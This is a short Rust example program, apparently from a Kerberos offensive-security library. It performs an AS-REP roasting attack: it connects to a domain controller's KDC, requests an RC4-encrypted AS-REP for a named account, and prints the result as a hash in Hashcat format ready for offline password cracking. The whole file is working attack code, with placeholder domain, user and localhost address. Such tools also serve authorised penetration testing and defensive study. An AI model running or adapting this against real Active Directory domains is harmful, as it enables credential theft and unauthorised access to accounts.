use cerbero_lib::{asreproast, CrackFormat, EncryptionType, KdcComm, Kdcs, TransportProtocol};
use std::net::{IpAddr, Ipv4Addr};

fn main()
{
	let mut kdcs = Kdcs::new();
	let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
	kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);

	let mut kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);

	match kdccomm.create_channel("DOMAIN.COM")
	{
		Ok(channel) => match asreproast(
		                                "DOMAIN.COM",
		                                "Username",
		                                CrackFormat::Hashcat,
		                                channel.as_ref(),
		                                Some(EncryptionType::RC4),
		)
		{
			Ok(hash) =>
			{
				println!("Crackable hash: {}", hash);
			},
			Err(e) => panic!("Failed to AS-REP roast: {}", e),
		},
		Err(e) => panic!("Failed to create a channel to the KDC: {}", e),
	}
}
